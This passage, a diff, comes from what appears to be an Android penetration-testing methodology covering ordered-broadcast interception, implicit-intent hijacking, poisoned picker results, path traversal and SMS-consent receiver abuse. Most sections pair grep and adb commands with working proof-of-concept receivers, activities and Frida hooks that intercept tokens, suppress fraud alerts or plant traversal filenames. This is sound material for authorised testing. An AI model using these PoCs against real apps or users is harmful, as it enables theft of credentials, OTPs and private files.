@@ -1310,3 +1310,1004 @@ adb shell dumpsys activity broadcasts | sed -n '/Sticky broadcasts/,/^$/p' | gre
   `abortBroadcast()` (D05-037, D05-038).
 - **Ruled out when:** The platform refuses your `sendStickyBroadcast` (`SecurityException` naming
   `BROADCAST_STICKY`) — paste it — or the app consumes no sticky broadcast at all.
+
+### D05-036 · Ordered-broadcast priority interception — and the Android 16 per-process narrowing
+
+| | |
+|---|---|
+| **Severity ceiling** | High (on API <= 35 only) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.two_fa_bypass` (P3) for an intercepted OTP |
+| **Attacker** | AM-03 |
+| **Applies to** | **API <= 35: works.** **API 36+ (Android 16): closed for ordered broadcasts.** Delivery order via `android:priority` / `IntentFilter#setPriority()` is no longer guaranteed across different processes; priorities are respected only within the same application process, and values are confined to the range `SYSTEM_LOW_PRIORITY + 1` .. `SYSTEM_HIGH_PRIORITY - 1`, with only system components allowed to set the extremes. This is an **all-apps** change, not targetSdk-gated. |
+| **Maps to** | `developer.android.com/about/versions/16/behavior-changes-all` (ordered-broadcast priority); `developer.android.com/guide/components/broadcasts` (ordered broadcasts, priority); MASTG-TECH-0164 |
+
+- **Test:** Nine community sources teach "register a receiver with a higher `android:priority` to
+  intercept, modify or abort the target's ordered broadcast". On Android 16 that no longer works across
+  processes. Version-gate the finding or it is closed as not-reproducible on a current device.
+- **How:**
+```bash
+grep -rnE 'sendOrderedBroadcast|setResultData|setResultCode|setResultExtras|abortBroadcast|getResultData|getResultExtras' out/sources/
+grep -nE 'android:priority' out/AndroidManifest.xml
+```
+  Attacker receiver, registered at runtime so the API 26 manifest restriction is irrelevant:
+```java
+IntentFilter f = new IntentFilter("com.target.app.ORDERED_ACTION");
+f.setPriority(999);
+registerReceiver(sniffer, f, Context.RECEIVER_EXPORTED);
+```
+  Run the identical PoC on two devices and diff:
+```bash
+adb -s emulator-5554 shell getprop ro.build.version.sdk    # 34/35 -> interception expected to work
+adb -s emulator-5556 shell getprop ro.build.version.sdk    # 36+   -> expected NOT to work
+adb shell am broadcast -a com.target.app.ORDERED_ACTION --receiver-foreground
+adb logcat -s PoC TARGET
+adb shell dumpsys package com.poc.zeroperm | grep -A3 -i 'priority'   # confirm the clamp
+```
+- **Proof:** The attacker's log line appearing **before** the target's on API <= 35, and after it or not at
+  all on API 36+. The two logcat captures side by side are both the evidence and the thing that tells you
+  which severity to claim.
+- **Escalation:** If the target used abort-on-receive to hide OTP or fraud-alert content, you now also
+  receive it → D13. Report as "affects the app's installed base below Android 16", with the Play Console
+  distribution figures if the client supplies them.
+- **Ruled out when:** The device under test is API 36+ **and** the app's `minSdk` is 36+ so no user is on an
+  affected release — otherwise the correct outcome is a version-gated finding, not a negative. **Do not
+  over-apply this correction:** the *activity chooser* priority technique (`android:priority="999"` to win
+  `ACTION_PICK` / `GET_CONTENT`) is a different mechanism and is **not** affected. Say which one your PoC
+  uses.
+
+### D05-037 · `abortBroadcast()` suppression of a security-relevant flow
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); to be paid as a denial of service you must reach `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) or `.critical_impact_and_or_easy_difficulty` (P2) — the `app_crash.malformed_android_intents` node is P5 |
+| **Attacker** | AM-03 |
+| **Applies to** | API <= 35 for cross-process priority (see D05-036). |
+| **Maps to** | `developer.android.com/guide/components/broadcasts` (ordered broadcasts, `abortBroadcast`) |
+
+- **Test:** Suppressing a fraud alert, a security notification, a session-expiry signal or a remote-wipe
+  trigger is a targeted denial of a *security feature*, which is the only framing that escapes the P5 DoS
+  node. Suppressing a UI refresh is not a finding.
+- **How:** Attacker receiver at the highest permitted priority calling `abortBroadcast()` in `onReceive`:
+```java
+public void onReceive(Context c, Intent i) { Log.e("PoC","suppressed " + i.getAction()); abortBroadcast(); }
+```
+```bash
+# baseline with the attacker app uninstalled, then with it installed
+adb uninstall com.poc.zeroperm; adb logcat -c; <drive the flow>; adb logcat -d > /tmp/base.log
+adb install poc.apk;            adb logcat -c; <drive the flow>; adb logcat -d > /tmp/abort.log
+diff /tmp/base.log /tmp/abort.log
+```
+- **Proof:** The victim's downstream receiver firing in the baseline capture and never firing with the
+  attacker app installed — the logcat delta, plus the user-visible consequence (the fraud alert that never
+  appeared).
+- **Escalation:** Pair with D05-036: abort the alert while you use the token you intercepted from the same
+  broadcast.
+- **Ruled out when:** The app does not use `sendOrderedBroadcast` at all, or the suppressed signal has a
+  server-side equivalent that still fires (show the server-side notification arriving). Suppression of a
+  purely cosmetic broadcast belongs in the graveyard.
+
+### D05-038 · `setResultData` / `setResultExtras` tampering
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) when the tampered result drives an auth decision |
+| **Attacker** | AM-03 |
+| **Applies to** | API <= 35 for cross-process priority (D05-036). |
+| **Maps to** | `developer.android.com/guide/components/broadcasts`; MASTG-TECH-0164 |
+
+- **Test:** Ordered broadcasts deliver one receiver at a time, and each may rewrite the payload the next
+  receiver sees. A higher-priority attacker receiver both reads and **substitutes** the data. The severity
+  is decided by what consumes the result.
+- **How:**
+```java
+public void onReceive(Context c, Intent i) {
+  Log.e("PoC", "saw: " + getResultData());
+  setResultCode(Activity.RESULT_OK);
+  setResultData("zq7x4mk9");
+  Bundle b = getResultExtras(true); b.putString("verified", "true"); setResultExtras(b);
+}
+```
+```bash
+grep -rn 'getResultData\|getResultExtras' out/sources/ -A8   # find what consumes it
+```
+- **Proof:** The victim acting on your substituted value — the marker appearing in the app's own log or in
+  an outbound request, or a branch taken that the real result would not have taken.
+- **Escalation:** → D15 if the result is echoed to the server; → D13 if it gates an auth or entitlement
+  branch.
+- **Ruled out when:** No `getResultData`/`getResultExtras` call reaches a branch or a network payload —
+  every consumer is display-only. Quote the consumer.
+
+### D05-039 · The app trusts `getResultData()` — sender-side ordered-result trust, broken on Android 16
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **Attacker** | AM-03 |
+| **Applies to** | **Android 16 (API 36) specifically.** On API <= 35 the developer's "our receiver runs first" assumption holds and this is not a finding. |
+| **Maps to** | `developer.android.com/about/versions/16/behavior-changes-all` (ordered-broadcast priority confined to the same application process) |
+
+- **Test:** The mirror of D05-036, and almost nobody covers it. An app that sends an ordered broadcast and
+  trusts `getResultData()` / `getResultExtras()` — or that relies on being first in the chain to sanitise
+  the result — loses that guarantee on Android 16. The app now consumes a value that a *lower*-priority
+  foreign receiver can still set, because priority no longer orders cross-process delivery.
+- **How:**
+```bash
+grep -rnE 'sendOrderedBroadcast|getResultData|getResultExtras' out/sources/ -A8
+```
+  Flag every `getResultData()` whose value reaches a branch. Then, **on an API 36+ device**, register a
+  foreign receiver for the same action at default priority and set a hostile result (code as in D05-038).
+- **Proof:** The app taking the attacker-set branch on an API 36 device — logcat or UI state — while the
+  developer's assumption was that their own receiver ran first. Include the `getprop ro.build.version.sdk`
+  output.
+- **Escalation:** → D15 if the result is forwarded to the backend.
+- **Ruled out when:** The app sends no ordered broadcasts, or every `getResultData()` consumer validates
+  the value against server state before acting, or the app's own receiver runs in the same process and the
+  ordering it relies on is intra-process (which Android 16 still honours). State which.
+
+### D05-040 · Implicit-intent sender inventory
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | n/a — enabler for D05-041 to D05-049 |
+| **Attacker** | AM-03 |
+| **Applies to** | All |
+| **Maps to** | MASTG-TEST-0372, MASTG-TEST-0374, MASTG-KNOW-0025 (Explicit vs Implicit Intents), MASTG-BEST-0056; Google vulnerability-classes auditing tip: "Look for all intent broadcasts that do not have a target set ... Lacks `setComponent`, `setClass`, `setClassName` or an explicit constructor." |
+
+- **Test:** Systematically list every implicit dispatch in the app, with the extras each carries. Each one
+  is interceptable by a component that declares a matching filter, and the extras at the construction site
+  determine the loss.
+- **How:** Build three sets and subtract:
+```bash
+grep -rnE '(startActivity|startActivityForResult|ActivityResultLauncher\.launch|startService|bindService|sendBroadcast|sendOrderedBroadcast)\s*\(' out/sources/ > /tmp/dispatch.txt
+grep -rnE 'putExtra|putExtras|replaceExtras' out/sources/ > /tmp/extras.txt
+grep -rnE 'setPackage|setClassName|setComponent|setClass\(' out/sources/ > /tmp/targeted.txt
+# dispatches whose file:line neighbourhood does not appear in targeted.txt are the implicit ones
+grep -rn 'new Intent("' out/sources/ | grep -v 'setPackage\|setComponent\|setClassName'
+grep -rn 'queryIntentActivities\|resolveActivity\|resolveService\|queryBroadcastReceivers' out/sources/
+# how disciplined is this codebase overall?
+wc -l /tmp/dispatch.txt /tmp/targeted.txt
+```
+  Exclude genuine user-chosen share flows (`ACTION_SEND` with a chooser) — MASTG explicitly carves those
+  out and a report that includes them reads as automated.
+- **Proof:** A table of implicit dispatches: action, extras carried, dispatch method, and whether a chooser
+  is shown. Count the rows and reconcile against the grep counts (do not iterate this in a shell array
+  loop).
+- **Escalation:** Each row becomes a D05-041 (extras leak) or D05-042 (delivery hijack) test case; rows
+  carrying a `content://` URI with grant flags go to D08.
+- **Ruled out when:** Every dispatch in the app either names a component/class, calls
+  `setPackage(getPackageName())`, or is a deliberate user-facing share/view flow with a chooser. Produce the
+  table either way — it is the artefact that closes the domain.
+
+### D05-041 · Implicit intent carrying sensitive extras to an unconstrained recipient
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a token; `broken_access_control.exposed_sensitive_android_intent` (null) for the mechanism |
+| **Attacker** | AM-03 |
+| **Applies to** | All |
+| **Maps to** | MASTG-TEST-0374, MASWE-0032 (CWE-927, CWE-940), MASTG-TECH-0164, MASTG-TOOL-0110 (semgrep), rule `mastg-android-implicit-intent-leaking-extras`; MASTG's own impact wording: "This can disclose credentials, session tokens, one-time codes, personal data, account identifiers, or internal state to an untrusted app." |
+
+- **Test:** The activity/service counterpart of D05-030. An Intent with an action but no
+  `setPackage`/`setClass`/`setComponent` delivers its **entire extras Bundle** to whichever installed app
+  wins resolution — not only the key the developer was thinking about.
+- **How:** The semgrep rule's exact shape, so you can hand-verify every match:
+```yaml
+patterns:
+  - pattern: |
+      $I = new Intent(...);
+      ...
+      $I.putExtra($KEY, $VAL);
+      ...
+      $CTX.startActivity($I);
+  - pattern-not: |
+      $I = new Intent($C, $CLASS);
+      ...
+  - pattern-not: |
+      $I = new Intent(...); ... $I.setPackage(...); ... $CTX.startActivity($I);
+  - pattern-not: |
+      $I = new Intent(...); ... $I.setComponent(...); ... $CTX.startActivity($I);
+```
+```bash
+semgrep -c rules/mastg-android-implicit-intent-leaking-extras.yml out/sources/
+adb shell dumpsys activity broadcasts | grep '<action>'    # metadata only; extras are not shown here
+run app.broadcast.sniff --action <action>                  # drozer prints the full extras bundle
+```
+- **Proof:** drozer's sniffer output, or your PoC component's log, showing the actual secret:
+```
+Action: theBroadcast
+Raw: Intent { act=theBroadcast flg=0x10 (has extras) }
+Extra: auth_token=eyJhbGciOi... (java.lang.String)
+```
+  Then the replayed 200.
+- **Escalation:** → D13/D15. A `content://` URI in the extras with `FLAG_GRANT_READ_URI_PERMISSION` is a
+  D08 grant-theft primitive, not just a leak.
+- **Ruled out when:** Every implicit dispatch carrying extras is a user-initiated share through a chooser
+  where the user selects the recipient, or the extras contain nothing beyond public display strings. Read
+  the construction site and list the keys in the ruled-out entry.
+
+### D05-042 · Implicit intent used for internal app communication — hijack by matching filter
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null, CWE-927) |
+| **Attacker** | AM-03 |
+| **Applies to** | All. `targetSdk >= 30` package-visibility limits *enumeration* of other apps, but the `<queries>` restriction does not stop your filter matching — it is not a defence here. |
+| **Maps to** | MASTG-TEST-0372 (Implicit Intents Used for Internal App Communication), MASWE-0032, MASTG-KNOW-0025, rule `mastg-android-implicit-intent-internal-communication`; `developer.android.com/privacy-and-security/risks/implicit-intent-hijacking` |
+
+- **Test:** Distinct from D05-041: here the payload may be harmless but the **delivery** is hijackable. The
+  app uses an action-only Intent to reach its *own* component. A third-party app declaring the same filter
+  becomes a resolution candidate; if it is the only handler, or the user has set it as default, the Intent
+  is delivered to the attacker with no chooser at all.
+- **How:**
+```bash
+grep -rnE 'new Intent\("[^"]+"\)|setAction\(' out/sources/ | grep -v 'setPackage\|setComponent\|setClass'
+adb shell cmd package query-activities -a com.target.app.INTERNAL_ACTION
+adb shell dumpsys package resolvers activity | sed -n '/com.target.app.INTERNAL_ACTION/,/^$/p'
+```
+  PoC component:
+```xml
+<activity android:name=".Catch" android:exported="true">
+  <intent-filter android:priority="999">
+    <action android:name="com.target.app.INTERNAL_ACTION"/>
+    <category android:name="android.intent.category.DEFAULT"/>
+  </intent-filter>
+</activity>
+```
+- **Proof:** `cmd package query-activities` listing **your** component as a resolver for an action the app
+  intended for itself, and launching the in-app flow landing in your activity — screenshot plus
+  `getIntent().getExtras()` dump.
+- **Escalation:** Substitute a phishing screen for the in-app flow (D04 UI redress), or return a poisoned
+  result (D05-046).
+- **Ruled out when:** Every internal dispatch names the component or calls
+  `setPackage(context.getPackageName())` — and `cmd package query-activities` for each action returns only
+  the target's own components with your PoC installed.
+
+### D05-043 · `android:priority="999"` chooser win plus silent forward-on
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null, CWE-927) |
+| **Attacker** | AM-03 |
+| **Applies to** | All. **Not** affected by the Android 16 ordered-broadcast change — activity resolution priority is a different mechanism. |
+| **Maps to** | MobSF `high_intent_priority_found` / `high_action_priority_found`; Oversecured "Interception of Android implicit intents"; CWE-927 |
+
+- **Test:** Winning the resolution is half the technique; the other half is making the user see nothing
+  wrong. Capture the Intent, log it, then re-dispatch it to the legitimate handler so the flow completes
+  normally. That converts a visible chooser prompt (Medium, "the user might notice") into a silent
+  man-in-the-middle (High).
+- **How:** Attacker activity's `onCreate`:
+```java
+Intent in = getIntent();
+for (String k : in.getExtras().keySet()) Log.e("PoC", k + " = " + in.getExtras().get(k));
+startActivity(new Intent(in).setComponent(null).setPackage("com.target.app"));
+finish();
+```
+```bash
+adb shell dumpsys package resolvers activity | sed -n '/com.target.ADD_CARD_ACTION/,/^$/p'
+```
+  In the target's own manifest, a `android:priority` above 100 on an `<intent-filter>` or `<action>` is a
+  separate red flag worth noting:
+```bash
+grep -nE 'android:priority="[0-9]{3,}"' out/AndroidManifest.xml
+```
+- **Proof:** `dumpsys package resolvers` listing your component ahead of the victim's for that action, your
+  `onCreate` log containing the victim's extras (card number, token, PII), **and** a screen recording
+  showing the user flow completing normally afterwards.
+- **Escalation:** → D07 file theft via an intercepted `ACTION_PICK` result; → D13 for credential or card
+  extras.
+- **Ruled out when:** The target never dispatches an implicit Intent whose action a third party can
+  declare, or the actions it uses are system-reserved and resolved only by system components (confirm with
+  `cmd package query-activities` with your PoC installed and priority set).
+
+### D05-044 · `queryIntentActivities` / `resolveActivity` ordering trusted as a gate
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **Attacker** | AM-03 |
+| **Applies to** | All. On `targetSdk >= 30` the app needs `<queries>` or `QUERY_ALL_PACKAGES` to see your package at all — which frequently makes the "safety check" return *nothing* and the app fail open. |
+| **Maps to** | MASTG-KNOW-0025; `developer.android.com/privacy-and-security/risks/implicit-intent-hijacking` |
+
+- **Test:** A common "defence" is `if (intent.resolveActivity(pm) != null) startActivity(intent)`, or
+  `queryIntentActivities(intent, 0)` followed by `setClassName(first)`. Both trust the resolver's ordering,
+  which you control with `android:priority`. Worse, under package-visibility filtering the query may return
+  an empty or truncated list, and the fallback branch is usually the unsafe one.
+- **How:**
+```bash
+grep -rn 'queryIntentActivities\|resolveActivity\|resolveService\|queryBroadcastReceivers' out/sources/ -A10
+grep -n '<queries>' -A20 out/AndroidManifest.xml
+grep -n 'QUERY_ALL_PACKAGES' out/AndroidManifest.xml
+```
+  Install the PoC with a priority-999 filter for the same action and re-run the flow; then repeat with the
+  PoC uninstalled to capture the fail-open branch.
+- **Proof:** The app calling your component because your entry sorted first, or taking the "no handler
+  found" branch and doing something unsafe (silently skipping a verification step, falling back to an
+  in-app WebView) when visibility filtering hid every resolver.
+- **Escalation:** Whatever the chosen or skipped path does — commonly D10 (WebView fallback) or D09.
+- **Ruled out when:** The code resolves to a fixed component name it verified by signature
+  (`PackageManager.checkSignatures` or a pinned certificate digest), not by resolver ordering. Quote the
+  signature check.
+
+### D05-045 · Implicit `startService` / `bindService`
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); if the reached service shells out, `insecure_os_firmware.command_injection` (P1, CWE-77) |
+| **Attacker** | AM-03 |
+| **Applies to** | All. `bindService` with an implicit Intent throws `IllegalArgumentException: Service Intent must be explicit` on modern platforms — verify on the in-scope API level. `startService` with an action-only Intent still resolves. |
+| **Maps to** | Bugcrowd's remediation text for `exposed_sensitive_android_intent`: "Using an implicit intent to start a service is a security risk as you can't be certain what service will respond to the intent" |
+
+- **Test:** An implicit `startService` is strictly worse than an implicit `startActivity` because there is
+  no chooser and no UI — the user cannot notice. Declare a matching service in the PoC and capture the
+  Intent.
+- **How:**
+```bash
+grep -rn 'startService(\|startForegroundService(\|bindService(' out/sources/ -B6 \
+  | grep -v 'setPackage\|setComponent\|setClass'
+adb shell cmd package query-services -a com.target.app.SERVICE_ACTION
+```
+```xml
+<service android:name=".CatchService" android:exported="true">
+  <intent-filter android:priority="999">
+    <action android:name="com.target.app.SERVICE_ACTION"/>
+  </intent-filter>
+</service>
+```
+- **Proof:** Your service's `onStartCommand` logging the victim's extras, with no UI shown to the user at
+  any point — record the screen to show nothing appeared.
+- **Escalation:** → D06 (bound-service surface) if the app also *exposes* a service for this action.
+- **Ruled out when:** Every service dispatch names a component or package, or `cmd package query-services`
+  with the PoC installed shows the action resolves only to the target's own service. Note the platform's
+  `bindService` exception separately — it does not cover `startService`.
+
+### D05-046 · Poisoned result from a hijacked `ACTION_GET_CONTENT` / `ACTION_PICK`
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); with an arbitrary write inside the sandbox, aim at `server_side_injection.remote_code_execution_rce` (P1) via the D17 chain |
+| **Attacker** | AM-03 (plus one user tap on your app in the chooser — state that precondition; both accepted Nextcloud reports did) |
+| **Applies to** | All |
+| **Maps to** | MASTG-TEST-0375, MASWE-0050 (CWE-20, CWE-22, CWE-73, CWE-345), MASTG-TECH-0043; H1 #1142918 (Nextcloud, Medium), H1 #1408692 (Nextcloud, Low 2.3, GHSA-vw2w-gpcv-v39f) |
+
+- **Test:** When the victim launches `ACTION_PICK`, `ACTION_GET_CONTENT` or `ACTION_IMAGE_CAPTURE` and
+  trusts the returned URI, your activity answers with a URI pointing at the victim's **own** private files.
+  The victim then uploads or shares them for you.
+- **How:**
+```xml
+<activity android:name=".EvilActivity" android:exported="true">
+  <intent-filter android:priority="999">
+    <action android:name="android.intent.action.GET_CONTENT"/>
+    <category android:name="android.intent.category.DEFAULT"/>
+    <category android:name="android.intent.category.OPENABLE"/>
+    <data android:mimeType="*/*"/>
+  </intent-filter>
+</activity>
+```
+```java
+setResult(RESULT_OK, new Intent().setData(
+    Uri.parse("file:///data/user/0/com.target.app/shared_prefs/com.target.app_preferences.xml")));
+finish();
+```
+```bash
+grep -rn 'onActivityResult\|registerForActivityResult\|ActivityResultLauncher' out/sources/ -A20 \
+  | grep -nE 'getData\(\)|getClipData\(\)|openInputStream|copyTo'
+```
+  Hook the consumer to see exactly what it trusts:
+```js
+Java.perform(function () {
+  var Act = Java.use('android.app.Activity');
+  Act.onActivityResult.implementation = function (req, res, data) {
+    console.log('[onActivityResult] req=' + req + ' res=' + res + ' data=' + (data ? data.toString() : 'null'));
+    if (data) { try { console.log('  getData=' + data.getData()); } catch (e) {} }
+    return this.onActivityResult(req, res, data);
+  };
+});
+```
+- **Proof:** The victim app uploading or sharing its own private file — the Nextcloud case showed the
+  resulting XML containing `select_oc_account` (the account email) and the FCM `pushToken`. Capture the
+  upload in Burp.
+- **Escalation:** → D11/D07 if the returned URI is a `content://` into a non-exported provider (D08 URI
+  grants); → D17 if the flow writes rather than reads.
+- **Ruled out when:** The consumer resolves the returned URI through `ContentResolver` and rejects `file://`
+  schemes and any authority outside an allow-list, **and** it does not use the returned display name for a
+  path. Show the scheme check.
+
+### D05-047 · Responder-controlled `DISPLAY_NAME` and `ClipData` — path traversal in the consumer
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); the chain target is `server_side_injection.remote_code_execution_rce` (P1) through D17 |
+| **Attacker** | AM-03 + one user tap |
+| **Applies to** | All. MASTG names this one of the most under-tested Android surfaces. |
+| **Maps to** | MASTG-TEST-0375, MASTG-TECH-0043, MASWE-0050 (CWE-20, CWE-22, CWE-73, CWE-345), MASVS-CODE-4 |
+
+- **Test:** The responder app fully controls `Intent.getData()`, `ClipData`, the extras, **and** the
+  provider metadata the consumer reads back via `ContentResolver.query` — notably
+  `OpenableColumns.DISPLAY_NAME`. A malicious responder returns path separators, unexpected schemes, or a
+  provider-controlled filename, and the consumer writes wherever you point it.
+- **How:** Build a PoC responder with its own `ContentProvider` that returns a hostile display name:
+```java
+// in the PoC provider's query()
+MatrixCursor c = new MatrixCursor(new String[]{ OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE });
+c.addRow(new Object[]{ "../../../../data/data/com.target.app/files/pwn.so", 128L });
+return c;
+```
+  Hook the consumer's metadata read:
+```js
+var CR = Java.use('android.content.ContentResolver');
+CR.query.overload('android.net.Uri','[Ljava.lang.String;','android.os.Bundle','android.os.CancellationSignal')
+ .implementation = function (u, p, b, s) { console.log('[CR.query] ' + u); return this.query(u, p, b, s); };
+```
+```bash
+grep -rn 'DISPLAY_NAME\|OpenableColumns\|getClipData\|getLastPathSegment' out/sources/ -A8
+```
+- **Proof:** A file appearing outside the intended directory inside the victim's sandbox, named by your
+  `DISPLAY_NAME` — `adb shell run-as com.target.app find files -newer <ref>`. Or the victim's own private
+  file overwritten.
+- **Escalation:** Arbitrary write into `files/` or `code_cache/` is a dynamic-code-loading primitive →
+  D17; into a WebView-reachable directory → D10.
+- **Ruled out when:** The consumer derives the destination filename from its own generator (a UUID, a hash)
+  and never from `DISPLAY_NAME` or the URI's last path segment, or it canonicalises and validates the
+  resulting path against the intended parent (`File.getCanonicalPath().startsWith(parent)`). Quote the
+  canonicalisation.
+
+### D05-048 · targetSdk 34 implicit-intent restriction — and the `exported="true"` fix that replaced it
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) — rate on the now-reachable component |
+| **Attacker** | AM-03 |
+| **Applies to** | `targetSdk >= 34`. Implicit intents are delivered only to **exported** components; the documented fix is `Intent(...).setPackage(context.getPackageName())`. Mutable `PendingIntent`s with an unspecified component or package now throw. |
+| **Maps to** | `developer.android.com/about/versions/14/behavior-changes-14` ("Implicit intents are restricted from being delivered to unexported components ... Use explicit intents for unexported components OR mark as exported") |
+
+- **Test:** The behaviour change broke apps that used implicit intents to reach their own internal
+  components. Two fixes were possible: add `setPackage()`, or flip the receiving component to
+  `exported="true"`. Many teams took the second. Diff the manifest against the pre-34 release to catch the
+  regression — it is a component that became public as a build-fix side effect.
+- **How:**
+```bash
+# pull an older release from the device or a store archive, decode both, diff
+diff <(xmllint --format old/AndroidManifest.xml) <(xmllint --format new/AndroidManifest.xml) | grep -n exported
+grep -rn 'setPackage(' out/sources/ | wc -l    # did they add these instead?
+adb shell dumpsys package com.target.app | grep 'exported=true'
+```
+  Then fire the newly exported component directly.
+- **Proof:** A component `exported="false"` in the pre-34 build and `"true"` in the targetSdk-34 build,
+  plus a successful `am broadcast -n` / `am start -n` against it with an observable effect.
+- **Escalation:** → D04 (activities), D06 (services), D08 (whatever it forwards).
+- **Ruled out when:** The diff shows no component gained `exported="true"` between the two builds, and the
+  `setPackage()` call-site count increased correspondingly. Keep both manifests in the evidence tree.
+
+### D05-049 · Android 14 did not fix implicit *sending* — the half the checklists get wrong
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); P1 via the token path in D05-030 |
+| **Attacker** | AM-03 |
+| **Applies to** | All |
+| **Maps to** | `developer.android.com/privacy-and-security/risks/implicit-intent-hijacking`; `developer.android.com/about/versions/14/behavior-changes-14` |
+
+- **Test:** The Android 14 change constrains delivery *to your own unexported components*. It does nothing
+  about the app broadcasting or launching an implicit Intent that a third-party app receives. Several
+  current community checklists mark the whole implicit-intent class as fixed at API 34 — it is not, and the
+  outbound half is where the tokens are.
+- **How:**
+```bash
+grep -rnE 'sendBroadcast\(|startActivity\(new Intent\("' out/sources/ | grep -v setPackage | grep -v setClass
+```
+  Attacker side, registered at runtime in the zero-permission APK:
+```java
+IntentFilter f = new IntentFilter("com.target.app.SYNC_TOKEN");
+f.setPriority(999);
+registerReceiver(sniffer, f, Context.RECEIVER_EXPORTED);
+```
+- **Proof:** Your receiver logging the extras bundle on a device running API 34+ — which pre-empts the
+  "that was fixed in Android 14" pushback before triage raises it. Include `getprop ro.build.version.sdk`
+  in the capture.
+- **Escalation:** → D13 session takeover.
+- **Ruled out when:** Every outbound dispatch is package- or component-targeted (the D05-040 table with the
+  targeted column all ticked). Note explicitly in the report that the API 34 change is not what closes it.
+
+### D05-050 · SMS User Consent receiver registered without `SmsRetriever.SEND_PERMISSION`
+
+| | |
+|---|---|
+| **Severity ceiling** | High (the unguarded registration alone; Critical once D05-051 lands) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.two_fa_bypass` (P3) if you inject an accepted OTP |
+| **Attacker** | AM-03 |
+| **Applies to** | Any app using the GMS SMS User Consent API — extremely common in fintech onboarding, card 3DS and OTP autofill. |
+| **Maps to** | `developers.google.com/identity/sms-retriever/user-consent/request` (documents `SmsRetriever.SEND_PERMISSION`, `EXTRA_CONSENT_INTENT`, `EXTRA_SMS_MESSAGE`, `CommonStatusCodes.SUCCESS`/`TIMEOUT`); MASWE-0020, MASWE-0018; CVE-2021-4438 (React Native SMS User Consent) |
+
+- **Test:** The documented registration passes `SmsRetriever.SEND_PERMISSION` so that **only Google Play
+  services** may deliver `com.google.android.gms.auth.api.phone.SMS_RETRIEVED`. An app that registers with
+  a two- or three-argument `registerReceiver` — or declares the receiver in the manifest with
+  `exported="true"` and no `android:permission` — lets any installed app deliver that broadcast with a
+  crafted `EXTRA_STATUS`, `EXTRA_SMS_MESSAGE` and `EXTRA_CONSENT_INTENT`.
+- **How:**
+```bash
+grep -rnE 'SMS_RETRIEVED_ACTION|startSmsUserConsent|SmsRetriever|EXTRA_CONSENT_INTENT|EXTRA_SMS_MESSAGE' out/sources/
+grep -rn 'SmsRetriever.SEND_PERMISSION' out/sources/       # the CORRECTLY guarded call sites
+grep -rnE 'registerReceiver\([^)]*,\s*2\s*\)' out/sources/  # ContextCompat.RECEIVER_EXPORTED == 2
+grep -nB2 -A8 'com.google.android.gms.auth.api.phone.SMS_RETRIEVED' out/AndroidManifest.xml
+grep -rn 'registerReceiver' out/sources/ | grep -i sms
+```
+  The documented-correct form is
+  `registerReceiver(smsVerificationReceiver, intentFilter, SmsRetriever.SEND_PERMISSION, null)`. A
+  two-argument `registerReceiver` here is the bug. **One correctly guarded call site next to several
+  unguarded ones is the proof it is a defect and not a design decision** — quote both in the report.
+- **Proof:** The unguarded registration in the decompile, plus `dumpsys activity broadcasts` showing the
+  live filter for `com.google.android.gms.auth.api.phone.SMS_RETRIEVED` under the target's UID with no
+  required permission, while the OTP screen is foreground.
+- **Escalation:** → D05-051 (arbitrary Intent launch, the Critical) and D05-052 (OTP injection). File this
+  primitive first so its id exists for the chain report.
+- **Ruled out when:** Every SMS-consent registration passes `SmsRetriever.SEND_PERMISSION` (or
+  `RECEIVER_NOT_EXPORTED` plus an explicit GMS package check), verified at **every** call site — this is
+  precisely the class where one unguarded sibling defeats a correct pattern elsewhere.
+
+### D05-051 · `EXTRA_CONSENT_INTENT` arbitrary-Intent-launch gadget and the self-grant exfiltration chain
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) plus `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for the token in the stolen file |
+| **Attacker** | AM-04 (the PoC needs `INTERNET` to exfiltrate; the read itself is AM-03) |
+| **Applies to** | Any app using GMS SMS User Consent / SMS autofill. **BAL gate on API 34+** — see the precondition below. |
+| **Maps to** | `developers.google.com/identity/sms-retriever/user-consent/request`; CWE-926; MASWE-0050; CVE-2021-4438 |
+
+- **Test:** The highest-value single receiver class in Android. On a success status with no OTP-message
+  extra, the receiver does the equivalent of
+  `launcher.launch((Intent) extras.getParcelable(EXTRA_CONSENT_INTENT))` — it starts an Intent you supplied,
+  **from the victim's UID, with no component, scheme or flag validation**. Point it at the victim's own
+  FileProvider with a read grant aimed at your activity and the victim self-grants you access to its
+  private files; `exported="false"` on the provider is irrelevant because the victim is the starter.
+- **How:** `adb shell am broadcast` **cannot** carry the GMS `Status` Parcelable — the PoC must be an APK.
